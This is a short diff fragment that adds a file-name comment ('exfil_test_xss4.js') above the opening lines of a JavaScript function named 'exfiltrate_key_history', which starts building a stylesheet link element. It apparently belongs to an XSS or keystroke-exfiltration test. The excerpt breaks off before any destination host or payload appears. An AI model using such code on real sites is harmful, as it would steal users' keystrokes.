@@ -1,3 +1,4 @@
+// exfil_test_xss4.js
 function exfiltrate_key_history() {
   var script = document.createElement("link");
   script.rel = "stylesheet";
